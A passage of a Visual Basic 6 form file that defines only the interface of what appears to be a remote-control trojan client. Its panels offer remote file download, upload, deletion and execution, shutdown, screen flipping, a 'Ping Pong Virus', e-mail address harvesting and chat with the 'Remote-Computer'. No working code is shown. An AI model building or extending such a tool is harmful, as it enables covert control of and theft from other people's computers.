            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   5
         Left            =   2505
         TabIndex        =   211
         Top             =   2880
         Width           =   1815
      End
      Begin VB.Label lblGemein 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "shut down windows"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   2
         Left            =   2460
         TabIndex        =   134
         Top             =   1920
         Width           =   2040
      End
      Begin VB.Label lblGemein 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "restart computer"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   1
         Left            =   2490
         TabIndex        =   133
         Top             =   1440
         Width           =   1935
      End
      Begin VB.Label lblGemein 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "tile windows"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   4
         Left            =   2760
         TabIndex        =   132
         Top             =   3360
         Width           =   1455
      End
      Begin VB.Label lblGemein 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "shut down screen"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   3
         Left            =   2520
         TabIndex        =   131
         Top             =   2400
         Width           =   1920
      End
      Begin VB.Label Label8 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "COOL STUFF"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2190
         TabIndex        =   130
         Top             =   0
         Width           =   2565
      End
      Begin VB.Label lblGemein 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "shut down computer"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   0
         Left            =   2370
         TabIndex        =   129
         Top             =   960
         Width           =   2160
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   11
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   17
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   174
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox Text1 
         Appearance      =   0  'Flat
         BackColor       =   &H00404000&
         ForeColor       =   &H00FFFFC0&
         Height          =   2895
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   176
         Text            =   "ds3English!.frx":5C18
         Top             =   720
         Width           =   6615
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "refresh"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   11.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   255
         Index           =   17
         Left            =   4560
         TabIndex        =   177
         Top             =   3735
         Width           =   2025
      End
      Begin VB.Label Label15 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "SYSTEM-INFOS"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1935
         TabIndex        =   175
         Top             =   0
         Width           =   3075
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   300
         Index           =   17
         Left            =   4440
         Shape           =   2  'Oval
         Top             =   3720
         Width           =   2295
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   17
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   15
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   161
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Timer Timer2 
         Enabled         =   0   'False
         Interval        =   5000
         Left            =   1680
         Top             =   3840
      End
      Begin VB.TextBox txtChatServer 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   1605
         Left            =   240
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         TabIndex        =   165
         Top             =   2400
         Width           =   6375
      End
      Begin VB.TextBox txtChatClient 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   1365
         Left            =   240
         MultiLine       =   -1  'True
         TabIndex        =   162
         Top             =   720
         Width           =   6375
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "Remote-Computer:"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   24
         Left            =   240
         TabIndex        =   166
         Top             =   2160
         Width           =   1680
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "Your Chat-Window:"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   23
         Left            =   240
         TabIndex        =   164
         Top             =   480
         Width           =   1785
      End
      Begin VB.Label Label13 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "CHAT"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2955
         TabIndex        =   163
         Top             =   0
         Width           =   1035
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   15
         Left            =   0
         Top             =   480
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   21
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   270
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox Text8 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C000&
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2535
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         TabIndex        =   273
         Top             =   720
         Width           =   6615
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "Yeah"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   480
         Index           =   22
         Left            =   4575
         TabIndex        =   272
         Top             =   3375
         Width           =   1995
      End
      Begin VB.Label Label20 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "FIND E-MAILS"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1935
         TabIndex        =   271
         Top             =   0
         Width           =   3075
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   525
         Index           =   22
         Left            =   4440
         Shape           =   2  'Oval
         Top             =   3360
         Width           =   2295
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   24
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   20
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   266
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label lblInternet 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Netstat"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   270
         Index           =   2
         Left            =   2880
         TabIndex        =   341
         Top             =   2640
         Width           =   1050
      End
      Begin VB.Label lblInternet 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "find e-mail adress(es)"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   270
         Index           =   1
         Left            =   1830
         TabIndex        =   269
         Top             =   2160
         Width           =   3300
      End
      Begin VB.Label lblInternet 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "start url"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   12
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   270
         Index           =   0
         Left            =   2790
         TabIndex        =   268
         Top             =   1680
         Width           =   1350
      End
      Begin VB.Label lbloben 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "INTERNET"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Index           =   4
         Left            =   2445
         TabIndex        =   267
         Top             =   0
         Width           =   2055
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   23
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   13
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   149
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "ping pong off"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   480
         Index           =   15
         Left            =   1620
         TabIndex        =   152
         Top             =   2535
         Width           =   3675
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "ping pong on"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   480
         Index           =   14
         Left            =   1620
         TabIndex        =   151
         Top             =   1455
         Width           =   3675
      End
      Begin VB.Label Label11 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Ping Pong Virus"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1560
         TabIndex        =   150
         Top             =   0
         Width           =   3855
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   525
         Index           =   14
         Left            =   1440
         Shape           =   2  'Oval
         Top             =   1440
         Width           =   4035
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   525
         Index           =   15
         Left            =   1440
         Shape           =   2  'Oval
         Top             =   2520
         Width           =   4035
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   21
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   14
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   153
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.OptionButton optAuswahl 
         BackColor       =   &H00808000&
         Caption         =   "info"
         Height          =   255
         Index           =   2
         Left            =   360
         TabIndex        =   160
         Top             =   3480
         Width           =   1095
      End
      Begin VB.OptionButton optAuswahl 
         BackColor       =   &H00808000&
         Caption         =   "error"
         Height          =   255
         Index           =   1
         Left            =   360
         TabIndex        =   159
         Top             =   3120
         Width           =   1095
      End
      Begin VB.OptionButton optAuswahl 
         BackColor       =   &H00808000&
         Caption         =   "ok"
         Height          =   255
         Index           =   0
         Left            =   360
         TabIndex        =   158
         Top             =   2760
         Width           =   1095
      End
      Begin VB.TextBox txttextfelder 
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFC0&
         Height          =   1005
         Index           =   18
         Left            =   240
         MultiLine       =   -1  'True
         TabIndex        =   154
         Top             =   1200
         Width           =   6375
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "test"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   315
         Index           =   30
         Left            =   2550
         TabIndex        =   222
         Top             =   2415
         Width           =   1635
      End
      Begin VB.Label Label12 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "MSG MANAGER"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2070
         TabIndex        =   157
         Top             =   0
         Width           =   2835
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "message text"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   26
         Left            =   240
         TabIndex        =   156
         Top             =   840
         Width           =   1260
      End
      Begin VB.Label lblueberschrift 
         Alignment       =   2  'Center
         BackColor       =   &H00808000&
         Caption         =   "Yeah"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   14.25
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   315
         Index           =   18
         Left            =   4830
         TabIndex        =   155
         Top             =   2415
         Width           =   1635
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   360
         Index           =   18
         Left            =   4680
         Shape           =   2  'Oval
         Top             =   2400
         Width           =   1935
      End
      Begin VB.Shape shpueberschrift 
         BackColor       =   &H00404000&
         BackStyle       =   1  'Opaque
         BorderStyle     =   0  'Transparent
         Height          =   360
         Index           =   30
         Left            =   2400
         Shape           =   2  'Oval
         Top             =   2400
         Width           =   1935
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   14
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   30
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   285
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.Label Label29 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "FLIP SCREEN"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   2085
         TabIndex        =   289
         Top             =   0
         Width           =   2835
      End
      Begin VB.Label lblDesktop 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "zigzag"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   1
         Left            =   3120
         TabIndex        =   288
         Top             =   2640
         Width           =   735
      End
      Begin VB.Label lblDesktop 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "vertically"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   2
         Left            =   2880
         TabIndex        =   287
         Top             =   2160
         Width           =   1215
      End
      Begin VB.Label lblDesktop 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "horizontally"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404000&
         Height          =   240
         Index           =   3
         Left            =   2760
         TabIndex        =   286
         Top             =   1680
         Width           =   1455
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3555
         Index           =   31
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   5
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   81
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.ListBox List1 
         Appearance      =   0  'Flat
         BackColor       =   &H00C0C000&
         ForeColor       =   &H00000000&
         Height          =   3180
         Left            =   120
         TabIndex        =   84
         Top             =   840
         Width           =   3855
      End
      Begin VB.TextBox Text5 
         Height          =   315
         Left            =   2880
         MultiLine       =   -1  'True
         ScrollBars      =   3  'Both
         TabIndex        =   207
         Text            =   "ds3English!.frx":5C29
         Top             =   1320
         Visible         =   0   'False
         Width           =   375
      End
      Begin VB.TextBox Text7 
         Height          =   375
         Left            =   2160
         TabIndex        =   216
         Top             =   1800
         Visible         =   0   'False
         Width           =   855
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "start file"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   10
         Left            =   4320
         TabIndex        =   217
         Top             =   3720
         Width           =   1050
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "type path"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   9
         Left            =   4320
         TabIndex        =   94
         Top             =   3420
         Width           =   945
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "file type"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   8
         Left            =   4320
         TabIndex        =   93
         Top             =   3120
         Width           =   945
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "rename file"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   7
         Left            =   4320
         TabIndex        =   92
         Top             =   2820
         Width           =   1155
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "kill file"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   6
         Left            =   4320
         TabIndex        =   91
         Top             =   2520
         Width           =   945
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "copy file"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   5
         Left            =   4320
         TabIndex        =   90
         Top             =   2220
         Width           =   945
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "show file"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   4
         Left            =   4320
         TabIndex        =   89
         Top             =   1920
         Width           =   945
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "stop up/downloading"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   3
         Left            =   4320
         TabIndex        =   88
         Top             =   1620
         Width           =   1995
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "upload"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   2
         Left            =   4320
         TabIndex        =   87
         Top             =   1320
         Width           =   630
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "download"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   1
         Left            =   4320
         TabIndex        =   86
         Top             =   1020
         Width           =   840
      End
      Begin VB.Label lblDateiF 
         AutoSize        =   -1  'True
         BackColor       =   &H00808000&
         BackStyle       =   0  'Transparent
         Caption         =   "get drives"
         ForeColor       =   &H00FFFFC0&
         Height          =   210
         Index           =   0
         Left            =   4320
         TabIndex        =   85
         Top             =   720
         Width           =   1050
      End
      Begin VB.Label Label1 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "FILE MANAGER"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   21.75
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404080&
         Height          =   495
         Left            =   1935
         TabIndex        =   83
         Top             =   0
         Width           =   3075
      End
      Begin VB.Label lblStandart 
         AutoSize        =   -1  'True
         BackColor       =   &H00000000&
         BackStyle       =   0  'Transparent
         Caption         =   "file manager"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   15
         Left            =   120
         TabIndex        =   82
         Top             =   600
         Width           =   1260
      End
      Begin VB.Shape shpDateiLeiste 
         BorderColor     =   &H00C0C000&
         Height          =   255
         Left            =   3960
         Top             =   720
         Width           =   2955
      End
      Begin VB.Shape shpHintergrundServer 
         BackColor       =   &H00808000&
         BackStyle       =   1  'Opaque
         BorderColor     =   &H00C0C000&
         Height          =   3435
         Index           =   7
         Left            =   0
         Top             =   600
         Width           =   6915
      End
   End
   Begin VB.PictureBox picContainer 
      Appearance      =   0  'Flat
      BackColor       =   &H00000000&
      ForeColor       =   &H80000008&
      Height          =   4215
      Index           =   16
      Left            =   2760
      ScaleHeight     =   4185
      ScaleWidth      =   6945
      TabIndex        =   167
      Top             =   480
      Visible         =   0   'False
      Width           =   6975
      Begin VB.TextBox txttextfelder 
         Alignment       =   1  'Right Justify
         Appearance      =   0  'Flat
         BackColor       =   &H00808000&
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   360
         Index           =   23
         Left            =   120
         TabIndex        =   205
         Top             =   1200
         Width           =   6735
      End
      Begin VB.Label lblHinweiszuServerEinstellungen 
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "Type Path (or the text):"
         ForeColor       =   &H00404000&
         Height          =   210
         Index           =   29
         Left            =   120
         TabIndex        =   206
         Top             =   960
         Width           =   6825
         WordWrap        =   -1  'True
      End
      Begin VB.Label lblAkOp 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "show text on the Screen"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   3
         Left            =   2100
         TabIndex        =   173
         Top             =   3360
         Width           =   2775
      End
      Begin VB.Label lblAkOp 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "beep"
         BeginProperty Font 
            Name            =   "Courier New"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00C0C000&
         Height          =   240
         Index           =   2
         Left            =   3180
         TabIndex        =   172
         Top             =   2880
         Width           =   495
      End
      Begin VB.Label lblAkOp 
         Alignment       =   2  'Center
         AutoSize        =   -1  'True
         BackStyle       =   0  'Transparent
         Caption         =   "play sound"
         BeginProperty Font 
